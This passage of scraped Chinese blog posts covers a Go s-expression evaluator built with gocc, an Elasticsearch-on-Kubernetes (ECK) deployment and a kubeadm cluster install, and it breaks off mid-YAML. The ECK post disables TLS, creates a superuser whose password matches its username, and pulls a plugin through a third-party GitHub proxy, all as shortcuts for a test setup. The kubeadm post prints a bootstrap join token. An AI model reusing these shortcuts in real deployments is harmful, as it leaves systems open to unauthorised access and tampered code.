翻没看过的藏书的时候找出一本《SICP》的 PDF（PS：已经买了正版书），想起曾经拿 Rust 写玩具解释器，结果现在连 Rust 本身都已经快忘光了。\n所以就当怀旧，写个很简单的玩具，s表达式求值器。\n技术栈 语言选择了 Go，用 gocc 生成 Parser/Lexer 。虽然说手写+调试 Lexer/Parser 也是挺快乐的，但毕竟只是怀旧重温下当年愣头青的自己，不想花太多时间。\n词法定义 简单解释下 gocc 定义词法元素的 DSL 是怎么回事。gocc 的这个 DSL 是类似于 EBNF 的语法（自称）， _letter: 'a'-'z' 就是一条产生式，:前面是产生式的名称，后面是模式。\n产生式名称也有特殊含义。\n ! 开头的产生式会被 Lexer 忽略。 _ 开头的产生式叫做 regDefId，可以理解成给后面的模式定义的别名。 a-z小写字母开头的是 token，也就是一般说的词法元素定义了。  值得注意的是 token 不能被用作其他词法元素产生式的模式部分，但 regDefId 可以，所以要注意要复用的规则应该定义成下划线开头。\n比如说下面的例子。\n1 2 3 4 5 6 7  // example 1 letter: \u0026#39;a\u0026#39;-\u0026#39;z\u0026#39;; identifier: letter; // Error! // example 2 _letter: \u0026#39;a\u0026#39;-\u0026#39;z\u0026#39;; identifier: _letter; // OK   下面是求值器的词法元素定义。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  !whitespace: \u0026#39; \u0026#39; | \u0026#39;\\t\u0026#39; | \u0026#39;\\r\u0026#39; | \u0026#39;\\n\u0026#39;; !comment: \u0026#39;;\u0026#39; {.} \u0026#39;\\n\u0026#39;; // // identifier // _letter : \u0026#39;a\u0026#39;-\u0026#39;z\u0026#39; | \u0026#39;A\u0026#39;-\u0026#39;Z\u0026#39;; _initial: _letter; _digit : \u0026#39;0\u0026#39;-\u0026#39;9\u0026#39; ; _special_subsequent : \u0026#39;.\u0026#39; | \u0026#39;+\u0026#39; | \u0026#39;-\u0026#39; | \u0026#39;!\u0026#39; | \u0026#39;?\u0026#39;; _subsequent: _initial | _digit | _special_subsequent; _peculiar_identifier: \u0026#39;+\u0026#39; | \u0026#39;-\u0026#39; | \u0026#39;.\u0026#39; \u0026#39;.\u0026#39; \u0026#39;.\u0026#39;; _identifier : _initial { _subsequent } | _peculiar_identifier; identifier: _identifier; quoted_identifier: \u0026#39;#\u0026#39; _identifier; // // boolean // _boolean_t: \u0026#39;#\u0026#39; \u0026#39;t\u0026#39;; _boolean_f: \u0026#39;#\u0026#39; \u0026#39;f\u0026#39;; boolean_t: _boolean_t; boolean_f: _boolean_f; // // string // _string_element: \u0026#39;\\\\\u0026#39; \u0026#39;\u0026#34;\u0026#39; | . | \u0026#39;\\\\\u0026#39; \u0026#39;\\\\\u0026#39;; _string : \u0026#39;\u0026#34;\u0026#39; { _string_element } \u0026#39;\u0026#34;\u0026#39;; string: _string; // // number // _sign: \u0026#39;+\u0026#39; | \u0026#39;-\u0026#39;; _uint10: _digit { _digit }; _ureal10 : [\u0026#39;.\u0026#39;] _uint10 | _uint10 \u0026#39;.\u0026#39; _digit {_digit}; _number : [_sign] _ureal10; number: _number;   词法元素很简单，运算符也当成 identifier 处理了，万一要扩展也容易。\n语法定义 gocc 的语法元素定义和词法元素定义差不多。产生式名称要用大写字母开头，后面跟的元素只能是 token、语法元素还有字符串字面量。另外就是在每个规则后面可以加上一个 “动作”，用过 flex/bison 的应该知道我说的啥。这个动作是一个表达式，求值后必须是 interface{}, error 这样的元组。这个求值结果会被 Parser 返回，所以需要在 Action 里就把 AST 组装好。\n另外值得一提的就是语法元素的定义是不支持 []、{} 这样的糖的，所以可选就得自己写成 Opt: Value | empty ，重复一或多次就得自己写成 Elements: Element | Elements Element 诸如此类。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  // // Syntax start here // \u0026lt;\u0026lt; import ( \u0026#34;github.com/nnnewb/minilang/pkg/ast\u0026#34; \u0026#34;github.com/nnnewb/minilang/pkg/bnf/token\u0026#34; ) \u0026gt;\u0026gt; // // value // Value : identifier \u0026lt;\u0026lt; ast.Identifier(string($0.(*token.Token).Lit)), nil \u0026gt;\u0026gt; | quoted_identifier \u0026lt;\u0026lt; ast.NewQuoted(ast.Identifier(string($0.(*token.Token).Lit[1:]))), nil \u0026gt;\u0026gt; | boolean_t \u0026lt;\u0026lt; ast.Boolean(true), nil \u0026gt;\u0026gt; | boolean_f \u0026lt;\u0026lt; ast.Boolean(false), nil \u0026gt;\u0026gt; | number \u0026lt;\u0026lt; ast.NewNumber(string($0.(*token.Token).Lit)) \u0026gt;\u0026gt; | string \u0026lt;\u0026lt; ast.String(string($0.(*token.Token).Lit)), nil \u0026gt;\u0026gt; | List \u0026lt;\u0026lt; $0, nil \u0026gt;\u0026gt; ; // // list // ListElements : Value \u0026lt;\u0026lt; ast.NewListWithInitial($0.(ast.Node)), nil \u0026gt;\u0026gt; | ListElements Value \u0026lt;\u0026lt; $0.(*ast.List).Append($1.(ast.Node)), nil \u0026gt;\u0026gt; ; List : \u0026#34;(\u0026#34; ListElements \u0026#34;)\u0026#34; \u0026lt;\u0026lt; $1, nil \u0026gt;\u0026gt; | \u0026#34;(\u0026#34; \u0026#34;)\u0026#34; \u0026lt;\u0026lt; ast.NewList(), nil \u0026gt;\u0026gt; | \u0026#34;#(\u0026#34; ListElements \u0026#34;)\u0026#34; \u0026lt;\u0026lt; ast.NewQuoted($1.(ast.Node)), nil \u0026gt;\u0026gt; | \u0026#34;#(\u0026#34; \u0026#34;)\u0026#34; \u0026lt;\u0026lt; ast.NewQuoted(ast.NewList()), nil \u0026gt;\u0026gt; ;   s表达式本身就是一个括号括起来的列表，所以语法元素更简单了，直接把词法元素放进去就行。\n解析和执行 执行环境 执行环境就是保存变量（考虑作用域的话还要嵌套）、函数（或者叫 procedure）、解释器内建的函数之类的东西的地方，简单实现成一个 map 就完事了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  type ExecutionEnv struct { symbols map[string]Value parent *ExecutionEnv } func NewExecutionEnv(parent *ExecutionEnv) *ExecutionEnv { return \u0026amp;ExecutionEnv{ symbols: make(map[string]Value), parent: parent, } } func (ee *ExecutionEnv) SetValue(name string, val Value) Value { old, ok := ee.symbols[name] ee.symbols[name] = val if ok { return old } return nil } func (ee *ExecutionEnv) LookupName(name string) Value { if val := ee.LookupLocalName(name); val != nil { return val } return ee.parent.LookupName(name) } func (ee *ExecutionEnv) LookupLocalName(name string) Value { if val, ok := ee.symbols[name]; ok { return val } return nil }   求值 语言定义里（不是 scheme 的语言定义，那个去参考 r4rs/r5rs/r6rs/r7rs，这里指的是我给这个玩具求值器的语言定义），(a b c) 这样的列表等于是 a(b, c) 这样的函数调用，而原始列表得写成 #(a b c)，可以理解成告诉求值器要把给出的表达式当成数据还是代码。\n类似的还有ident会被求值，在执行环境里寻找对应的变量；#ident 求值结果就是标识符ident。\n求值过程就是简单的做个 type switch，字面量不管，原始列表和标识符返回内容，再然后就是列表当成函数求值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  func (ee *ExecutionEnv) EvaluateList(list List) (Value, error) { if len(list) \u0026gt; 0 { first, err := ee.Evaluate(list[0]) if err != nil { return nil, err } if fn, ok := first.(BuiltinFunc); !ok { return nil, fmt.Errorf(\u0026#34;TypeError: %v(%T) is not callable\u0026#34;, first, first) } else { args := make([]Value, 0, len(list[1:])) for _, v := range list[1:] { arg, err := ee.Evaluate(v) if err != nil { return nil, err } args = append(args, arg) } return fn(ee, args) } } return nil, nil } func (ee *ExecutionEnv) Evaluate(val Value) (Value, error) { switch v := val.(type) { case *List: return ee.EvaluateList(*v) case Identifier: return ee.LookupName(string(v)), nil case *Quoted: return v.GetValue().(Value), nil default: return v, nil } }   因为还没写 procdure 的定义，所以直接拿 Builtin 做了类型断言判断是不是可以调用。我寻思传参大概会是个挺麻烦的事情。\nREPL 最后就是解释器本体了，用 go-prompt 做了个简单的循环，再加上一点算数函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  package main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/c-bata/go-prompt\u0026#34; \u0026#34;github.com/nnnewb/minilang/internal/builtin\u0026#34; \u0026#34;github.com/nnnewb/minilang/internal/environment\u0026#34; \u0026#34;github.com/nnnewb/minilang/pkg/ast\u0026#34; \u0026#34;github.com/nnnewb/minilang/pkg/bnf/lexer\u0026#34; \u0026#34;github.com/nnnewb/minilang/pkg/bnf/parser\u0026#34; ) func main() { for { input := prompt.Input(\u0026#34;\u0026gt;\u0026#34;, func(d prompt.Document) []prompt.Suggest { return []prompt.Suggest{} }) if input == \u0026#34;.quit\u0026#34; { break } ee := environment.NewExecutionEnv(nil) builtin.RegisterArithmeticBuiltin(ee) ee.SetValue(\u0026#34;display\u0026#34;, environment.BuiltinFunc(func(ee *environment.ExecutionEnv, args []environment.Value) (environment.Value, error) { for _, v := range args { fmt.Printf(\u0026#34;%v\u0026#34;, v) } println() return nil, nil })) lexer := lexer.NewLexer([]byte(input)) parser := parser.NewParser() parseResult, err := parser.Parse(lexer) if err != nil { fmt.Printf(\u0026#34;parse error %v\\n\u0026#34;, err) continue } val := environment.NewValueFromASTNode(parseResult.(ast.Node)) evaluated, err := ee.Evaluate(val) if err != nil { fmt.Printf(\u0026#34;evaluation failed, error %v\\n\u0026#34;, err) continue } fmt.Printf(\u0026#34;# (%T) %v\\n\u0026#34;, evaluated, evaluated) } }   最后执行的效果就是这样：\n1 2 3  \u0026gt;(display \u0026#34;Hello world!\u0026#34;) \u0026#34;Hello world!\u0026#34; # (\u0026lt;nil\u0026gt;) \u0026lt;nil\u0026gt;   总结 s表达式求值不是什么大不了的东西，但 Lisp/Scheme 中体现出的那种 “代码即数据” 的思想还是很有意思的，甚至是很有想象力的。\n不管是命令式语言还是函数式语言，代码和数据都是被分开讨论的。“代码”处理“数据”，放在 Lisp 家族里就是 “代码”处理“代码”，有没有联想到 AI ？\n好吧，毕竟是上世纪的古董了，现在说起 AI 都是 Python 和神经网络。但不管怎么说吧，Lisp/Scheme 还是挺好玩的对吧？没事可以上 Racket 官网看看，说不定会喜欢上 Lisp 的奇妙之处呢。\n","date":"2021-12-09T17:11:00+08:00","permalink":"https://nnnewb.github.io/blog/p/a-s-exp-evaluator/","title":"一个s表达式求值器"},{"content":"前言 因为工作需要，得在自己搭建的集群里部署一个 Elasticsearch 。又因为是云端的集群，在 k8s 外用 docker 单独起一个 ES 明显更难维护（但部署更简单），于是选择用 ECK 。\nECK 就是 Elastic Cloud on Kubernetes 的缩写，可以理解成部署在 Kubernetes 上的 Elasticsearch 。当然不止 ES 。\n部署 ES 的过程遇到几个问题记录下怎么解决的。\n ES 使用自签名证书，导致 HTTP 不能连接。 ECK 需要安装 IK 分词插件。 ECK 默认密码每次部署都重新生成，而且默认用户权限过大。 ECK 默认没配 PVC ，数据没有持久化。  接下来逐个解决。\n0x01 自签名证书 自签名证书解决方法有几个\n 改客户端，让客户端用自签名证书连接。很麻烦。 生成一个固定的证书，让ES和客户端都用这个证书，客户端和ES都要改。很麻烦。 禁用 ES 的自签名证书。  考虑到是私有的测试环境，不搞这些烦人的东西，直接禁用。\n修改 YAML 如下。\n1 2 3 4 5 6 7 8 9  apiVersion:elasticsearch.k8s.elastic.co/v1kind:Elasticsearchmetadata:name:elasticsearchspec:http:tls:selfSignedCertificate:disabled:true  注意 spec.http.tls.selfSignedCertificate.disabled 这个字段。\n参考文档：Orchestrating Elastic Stack applications - Access Elastic Stack services - TLS certificates\n0x02 安装 IK 分词组件 官方文档提供的安装插件思路是利用 initContainer 。参考文档：init containers for plugin downloads 。\n1 2 3 4 5 6 7 8 9 10 11 12 13  spec:nodeSets:- name:defaultcount:3podTemplate:spec:initContainers:- name:install-pluginscommand:- sh- -c- |bin/elasticsearch-plugin install --batch repository-gcs  initContainer 容器默认会继承自下面的内容：\n 没有另外指定的情况下，继承主容器的镜像(我的例子中，就是 Elasticsearch:7.9.1) 主容器的 volume 挂载，如果 initContainer 有同名同路径的 volume 则优先用 initContainer 的。 POD 名称和 IP 。  0x03 添加自定义用户 有好几种方式：\n 官方文档中的方法：k8s users and roles，比较稳定，但还是挺麻烦的。 修改 [es-cluster-name]-es-elastic-user 这个 secret，好处是简单，但要求必须先创建 secret 再创建 ES ，单个 YAML 去 create -f 的情况下不友好。 基于第2节中利用 initContainer 的做法和官方文档里提到的 elasticsearch-users 命令行工具，直接在 initContainer 里创建指定用户名密码的用户。不确定这个做法会不会在多节点 ECK 里出问题，毕竟这等于是每个节点都创建了一次用户。不过我只需要单节点，所以也还过得去。  最终决定用第 3 种方法，因为做一个单节点集群简单不费事，多节点的话，目前开的服务器配置也吃不消。（其实是搞完才仔细读文档，第 1 种方法其实也不算太麻烦\u0026hellip;）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  spec:nodeSets:- name:defaultcount:3podTemplate:spec:initContainers:- name:donviewclass-initializecommand:- sh- -c- |./bin/elasticsearch-plugin install -batch https://ghproxy.com/https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.9.1/elasticsearch-analysis-ik-7.9.1.zip ./bin/elasticsearch-users useradd tsdonviewclass -p tsdonviewclass -r superuser  ./bin/elasticsearch-users useradd tsdonviewclass -p tsdonviewclass -r superuser 主要就是增加这一句。同样是因为懒，权限直接给了 superuser 。\n参考文档：elasticsearch-users 。\n0x04 配置PVC 依然是参考官方文档来：k8s-volume-claim-templates。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  spec:nodeSets:- name:defaultcount:1config:node.store.allow_mmap:falsevolumeClaimTemplates:- metadata:name:elasticsearch-data# Do not change this name unless you set up a volume mount for the data path.spec:accessModes:- ReadWriteOnceresources:requests:storage:5GistorageClassName:local-path  注意 volumeClaimTemplates 下 metadata.name 不要变，除非你自己在 podTemplate 里覆写挂载字段。\n其他的 spec 下内容和通常的 PVC 一样，可以参考 Kubernetes - PersistentVolumeClaims 。\n值得注意的是 ECK 默认在集群节点数量 scaled down 时删除 PVC ，对应的 PV 可能保留，具体看存储类的回收策略。ECK 的 CRD 里也给了相关的配置项。\n1 2 3 4 5 6 7 8 9 10  apiVersion:elasticsearch.k8s.elastic.co/v1kind:Elasticsearchmetadata:name:esspec:version:7.15.2volumeClaimDeletePolicy:DeleteOnScaledownOnlynodeSets:- name:defaultcount:3  注意 volumeClaimDeletePolicy: DeleteOnScaledownOnly 。可选的策略包括：\n DeleteOnScaledownAndClusterDeletion DeleteOnScaledownOnly  默认策略是 DeleteOnScaledownAndClusterDeletion ，集群删除和 scaled down 时删除 PVC。\n如果是一次性的部署，可以直接用 emptyDir 作为存储类，不用管数据丢不丢。\n总结 这几步配置下来，一个开发用的 ES 集群就算是配完了，资源给够就能开始玩了。\n讲道理我不太会运维 ES 啊，ES 这东西实在有点重量级，现阶段的能力也就只能看文档这里那里配一下，在上面开发什么的。真要遇到大问题还得抓瞎。\n就先这样吧。\n","date":"2021-11-30T11:13:00+08:00","permalink":"https://nnnewb.github.io/blog/p/simple-eck-cluster-deployment/","title":"简单的ECK部署"},{"content":"前言 好吧，如果仔细想想就会发现不管是 k3s 还是 ucloud 上的 k8s ，都没有一个是自己手动配置好的。虽说并不是至关重要的，但手动用 kubeadm 装一次 kubernetes 总不会有什么坏处。顺手做个笔记。参考资料列出如下。\n https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/ https://mirrors.tuna.tsinghua.edu.cn/help/kubernetes/ https://computingforgeeks.com/deploy-kubernetes-cluster-on-ubuntu-with-kubeadm/  系统配置 正式安装之前先确认一些系统级配置。\nswapoff 简单的做法是 sudo swapoff -a 即可。之后改 fstab 把 swap 分区关掉。\niptables检查桥接流量 用 lsmod | grep bf_netfitler 检查有没有启用 bf_netfilter 模块，如果没有输出的话说明没加载，执行下面的命令。\n1 2 3  cat \u0026lt;\u0026lt;EOF | sudo tee /etc/modules-load.d/k8s.conf br_netfilter EOF   会在 /etc/modules-load.d 下添加一个模块自动加载的配置。\n1 2 3 4  cat \u0026lt;\u0026lt;EOF | sudo tee /etc/sysctl.d/k8s.conf net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 EOF   再在 /etc/sysctl.d/ 下添加一个配置，允许 iptables 查看桥接流量。\n然后用 sysctl 重载配置。\n1  sudo sysctl --system   端口 控制平面节点的端口清单，如果有本机防火墙的话需要开放下面的端口。\n   协议 方向 端口范围 作用 使用者     TCP 入站 6443 Kubernetes API 服务器 所有组件   TCP 入站 2379-2380 etcd 服务器客户端 API kube-apiserver, etcd   TCP 入站 10250 Kubelet API kubelet 自身、控制平面组件   TCP 入站 10251 kube-scheduler kube-scheduler 自身   TCP 入站 10252 kube-controller-manager kube-controller-manager 自身    工作节点的端口清单，如果有本机防火墙的话需要开放下面的端口。\n   协议 方向 端口范围 作用 使用者     TCP 入站 10250 Kubelet API kubelet 自身、控制平面组件   TCP 入站 30000-32767 NodePort 服务† 所有组件    容器运行时 参考 清华大学开源软件镜像站 Docker Community Edition 镜像使用帮助。\n安装kubeadm 先信任软件仓库的证书，要注意的是证书托管在谷歌，所以基本不用考虑直接执行命令能成功了。\n1  curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -   作为代替，可以先手动魔法上网下载到证书，再变通一下完成证书添加。\n1  cat apt-key.gpg | sudo apt-key add -   之后添加源，源的版本并不能直接对应到发行版的版本，目前 ubuntu server 只支持到 16.04 LTS ，或者 Debian 9 Stretch 。更高版本也可以装，但我比较怀疑官方的包到底有没有在新发行版里测试过，支持力度行不行。\n总之，如果宿主机不拿来当开发环境使的话，上个 Ubuntu server 16.04 LTS 也没事，只要还没有完全停止支持就好。总之这个问题上我保留意见吧。\n1  echo \u0026#39;deb https://mirrors.tuna.tsinghua.edu.cn/kubernetes/apt kubernetes-xenial main\u0026#39; | sudo tee /etc/apt/sources.list.d/kubernetes.list   添加软件源之后更新软件包清单并安装 kubelet、kubeadm、kubectl 。\n1 2 3  sudo apt update sudo apt install -y kubelet kubeadm kubectl sudo apt-mark hold kubelet kubeadm kubectl   检查 首先确认所有 kubelet、kubeadm、kubectl 命令都已经可用，如果命令不存在则说明安装有问题，根据具体情况处理。\n然后检查kubelet服务的状态（注意用了systemd，不确定有没有用 upstart 或别的 Unix 风格的服务管理的）。\n运行命令 sudo systemctl status kubelet 得到下面的输出。\n1 2 3 4 5 6 7 8  ● kubelet.service - kubelet: The Kubernetes Node Agent Loaded: loaded (/lib/systemd/system/kubelet.service; enabled; vendor preset: enabled) Drop-In: /etc/systemd/system/kubelet.service.d └─10-kubeadm.conf Active: activating (auto-restart) (Result: exit-code) since Fri 2021-11-19 02:32:29 UTC; 9s ago Docs: https://kubernetes.io/docs/home/ Process: 6767 ExecStart=/usr/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS (code=exited, status=1/FAILURE) Main PID: 6767 (code=exited, status=1/FAILURE)   此时的 kubelet 服务还是失败的状态，再检查 kubelet 的日志，通过 sudo journalctl -u kubelet 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  -- Logs begin at Thu 2021-11-18 07:40:58 UTC, end at Fri 2021-11-19 02:34:19 UTC. -- Nov 19 02:27:41 vm systemd[1]: Started kubelet: The Kubernetes Node Agent. Nov 19 02:27:42 vm systemd[1]: kubelet.service: Current command vanished from the unit file, execution of the command list won\u0026#39;t be resumed. Nov 19 02:27:42 vm systemd[1]: Stopping kubelet: The Kubernetes Node Agent... Nov 19 02:27:42 vm systemd[1]: kubelet.service: Succeeded. Nov 19 02:27:42 vm systemd[1]: Stopped kubelet: The Kubernetes Node Agent. Nov 19 02:27:42 vm systemd[1]: Started kubelet: The Kubernetes Node Agent. Nov 19 02:27:42 vm kubelet[5944]: E1119 02:27:42.559949 5944 server.go:206] \u0026#34;Failed to load kubelet config file\u0026#34; err=\u0026#34;failed to load Kubelet config file /var/lib/kubelet/config.yaml, error failed to read kube\u0026gt; Nov 19 02:27:42 vm systemd[1]: kubelet.service: Main process exited, code=exited, status=1/FAILURE Nov 19 02:27:42 vm systemd[1]: kubelet.service: Failed with result \u0026#39;exit-code\u0026#39;. Nov 19 02:27:52 vm systemd[1]: kubelet.service: Scheduled restart job, restart counter is at 1. Nov 19 02:27:52 vm systemd[1]: Stopped kubelet: The Kubernetes Node Agent. Nov 19 02:27:52 vm systemd[1]: Started kubelet: The Kubernetes Node Agent. Nov 19 02:27:52 vm kubelet[6119]: E1119 02:27:52.804723 6119 server.go:206] \u0026#34;Failed to load kubelet config file\u0026#34; err=\u0026#34;failed to load Kubelet config file /var/lib/kubelet/config.yaml, error failed to read kube\u0026gt; Nov 19 02:27:52 vm systemd[1]: kubelet.service: Main process exited, code=exited, status=1/FAILURE Nov 19 02:27:52 vm systemd[1]: kubelet.service: Failed with result \u0026#39;exit-code\u0026#39;.   失败的原因是 Failed to load kubelet config file\u0026quot; err=\u0026quot;failed to load Kubelet config file /var/lib/kubelet/config.yaml, error failed to read kube\u0026gt;。\n创建集群 目标是创建一个单节点的集群。\n拉取镜像 众所周知的原因，kubernetes 的镜像托管在谷歌服务器上，麻瓜是访问不到的，所以就连拉取镜像也值得用几十个字来说。\n1  sudo kubeadm config images pull --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers   初始化主节点 注意使用 kubeadm config images pull 拉取了镜像的话，在 init 阶段除非你把镜像 tag 给改了，不然也要传个 --image-repository 参数。\n1  sudo kubeadm init --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers   完整输出如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  [init] Using Kubernetes version: v1.22.4 [preflight] Running pre-flight checks [preflight] Pulling images required for setting up a Kubernetes cluster [preflight] This might take a minute or two, depending on the speed of your internet connection [preflight] You can also perform this action in beforehand using \u0026#39;kubeadm config images pull\u0026#39; [certs] Using certificateDir folder \u0026#34;/etc/kubernetes/pki\u0026#34; [certs] Generating \u0026#34;ca\u0026#34; certificate and key [certs] Generating \u0026#34;apiserver\u0026#34; certificate and key [certs] apiserver serving cert is signed for DNS names [kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local vm] and IPs [10.96.0.1 10.0.2.15] [certs] Generating \u0026#34;apiserver-kubelet-client\u0026#34; certificate and key [certs] Generating \u0026#34;front-proxy-ca\u0026#34; certificate and key [certs] Generating \u0026#34;front-proxy-client\u0026#34; certificate and key [certs] Generating \u0026#34;etcd/ca\u0026#34; certificate and key [certs] Generating \u0026#34;etcd/server\u0026#34; certificate and key [certs] etcd/server serving cert is signed for DNS names [localhost vm] and IPs [10.0.2.15 127.0.0.1 ::1] [certs] Generating \u0026#34;etcd/peer\u0026#34; certificate and key [certs] etcd/peer serving cert is signed for DNS names [localhost vm] and IPs [10.0.2.15 127.0.0.1 ::1] [certs] Generating \u0026#34;etcd/healthcheck-client\u0026#34; certificate and key [certs] Generating \u0026#34;apiserver-etcd-client\u0026#34; certificate and key [certs] Generating \u0026#34;sa\u0026#34; key and public key [kubeconfig] Using kubeconfig folder \u0026#34;/etc/kubernetes\u0026#34; [kubeconfig] Writing \u0026#34;admin.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;kubelet.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;controller-manager.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;scheduler.conf\u0026#34; kubeconfig file [kubelet-start] Writing kubelet environment file with flags to file \u0026#34;/var/lib/kubelet/kubeadm-flags.env\u0026#34; [kubelet-start] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; [kubelet-start] Starting the kubelet [control-plane] Using manifest folder \u0026#34;/etc/kubernetes/manifests\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-apiserver\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-controller-manager\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-scheduler\u0026#34; [etcd] Creating static Pod manifest for local etcd in \u0026#34;/etc/kubernetes/manifests\u0026#34; [wait-control-plane] Waiting for the kubelet to boot up the control plane as static Pods from directory \u0026#34;/etc/kubernetes/manifests\u0026#34;. This can take up to 4m0s sudo kubeadm init --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers[apiclient] All control plane components are healthy after 9.003038 seconds [upload-config] Storing the configuration used in ConfigMap \u0026#34;kubeadm-config\u0026#34; in the \u0026#34;kube-system\u0026#34; Namespace [kubelet] Creating a ConfigMap \u0026#34;kubelet-config-1.22\u0026#34; in namespace kube-system with the configuration for the kubelets in the cluster [upload-certs] Skipping phase. Please see --upload-certs [mark-control-plane] Marking the node vm as control-plane by adding the labels: [node-role.kubernetes.io/master(deprecated) node-role.kubernetes.io/control-plane node.kubernetes.io/exclude-from-external-load-balancers] [mark-control-plane] Marking the node vm as control-plane by adding the taints [node-role.kubernetes.io/master:NoSchedule] [bootstrap-token] Using token: jfhacg.2ahc3yqndiwct9vk [bootstrap-token] Configuring bootstrap tokens, cluster-info ConfigMap, RBAC Roles [bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to get nodes [bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials [bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token [bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster [bootstrap-token] Creating the \u0026#34;cluster-info\u0026#34; ConfigMap in the \u0026#34;kube-public\u0026#34; namespace [kubelet-finalize] Updating \u0026#34;/etc/kubernetes/kubelet.conf\u0026#34; to point to a rotatable kubelet client certificate and key [addons] Applied essential addon: CoreDNS [addons] Applied essential addon: kube-proxy Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config Alternatively, if you are the root user, you can run: export KUBECONFIG=/etc/kubernetes/admin.conf You should now deploy a pod network to the cluster. Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 10.0.2.15:6443 --token jfhacg.2ahc3yqndiwct9vk \\ --discovery-token-ca-cert-hash sha256:377d6ead2bde8373000333d883c9bd9449233686fe277814ccade0b55fc362a1   因为是虚拟机里的集群，也没打算给任何人访问，关键信息懒得打码了。\n几个值得关注的内容：\n1 2 3 4 5 6 7 8 9 10 11  # Your Kubernetes control-plane has initialized successfully! # To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config # Alternatively, if you are the root user, you can run: export KUBECONFIG=/etc/kubernetes/admin.conf   首先，集群控制平面已经初始化成功了，说明命令执行基本 OK，没有致命错误。\n后面就是教你怎么配置 kubectl 来访问控制平面，集群的管理员配置放在 /etc/kubernetes/admin.conf ，可以用 KUBECONFIG 环境变量来使用，或者把配置文件复制到家目录下的路径 ~/.kube/config 。\n1 2 3  You should now deploy a pod network to the cluster. Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/   提示你应该部署一个 POD 网络到集群，也就是一般说的 CNI 插件，以便 POD 之间可以互相通信。安装插件之前，集群的 DNS （CoreDNS） 不会启动。\n1 2 3 4  Then you can join any number of worker nodes by running the following on each as root: kubeadm join 10.0.2.15:6443 --token jfhacg.2ahc3yqndiwct9vk \\ --discovery-token-ca-cert-hash sha256:377d6ead2bde8373000333d883c9bd9449233686fe277814ccade0b55fc362a1   一旦搞定了网络插件，就可以用 kubeadm 继续添加新的节点到集群里了。\n安装网络插件 看起来大家都在用 calico 做 POD 网络，所以我也用 calico 好了。步骤参考 calico 的官方文档 和 官方的快速开始 来配置一个单节点集群的 POD 。\n正式开始前，参考上面的内容配置好 kubectl ，以便无需 root 权限运行 kubectl 命令。\n先下载 calico 的 k8s 资源。\n1  curl https://docs.projectcalico.org/manifests/calico-typha.yaml -o calico.yaml   按照说明，判断下 POD 的 CIDR（POD的网段），用 sudo kubectl --kubeconfig /etc/kubernetes/admin.conf get cm kubeadm-config -n kube-system -o yaml 获取 kubeadm-config 这个 configmap，检查其中的 networking.podSubnet 值。在我这里的输出如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  apiVersion:v1data:ClusterConfiguration:|apiServer: extraArgs: authorization-mode: Node,RBAC timeoutForControlPlane: 4m0s apiVersion: kubeadm.k8s.io/v1beta3 certificatesDir: /etc/kubernetes/pki clusterName: kubernetes controllerManager: {} dns: {} etcd: local: dataDir: /var/lib/etcd imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers kind: ClusterConfiguration kubernetesVersion: v1.22.4 networking: dnsDomain: cluster.local serviceSubnet: 